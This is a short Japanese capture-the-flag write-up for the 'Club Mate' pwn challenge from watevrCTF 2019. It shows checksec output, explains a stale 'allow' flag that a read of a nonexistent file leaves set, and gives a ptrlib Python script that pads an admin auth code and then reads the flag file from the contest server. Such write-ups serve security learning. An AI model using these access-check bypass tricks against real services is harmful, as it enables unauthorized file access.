# [pwn 144pts] Club Mate - watevrCTF 2019
64ビットバイナリで、PIEやRELROが無効です。
```
$ checksec -f wat-sql
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes     0               3       wat-sql
```
フラグ以外のファイルが読めますが、allowフラグが立っていればフラグも読めます。
allowフラグは有効なファイルを読もうとしたときに立ちますが、ファイルが存在しないときにそのまま放置されます。
なので存在しないファイルを読んでからフラグを読めば開けます。
```python
from ptrlib import *

#sock = Process("./wat-sql")
sock = Socket("13.53.39.99", 50000)

# auth
code = b'watevr-sql2019-demo-code-admin'
code += b'\x00' * (0x20 - len(code))
code += b'sey'
sock.sendafter(": ", code)

# abort read
sock.sendlineafter("Query: ", "read ")
sock.sendlineafter("from: ", "/ponta")

# read flag
sock.sendlineafter("Query: ", "read ")
sock.sendlineafter("from: ", "/home/ctf/flag.txt")
sock.sendlineafter("read: ", "0")

sock.interactive()
```

# 感想
簡単ですね。
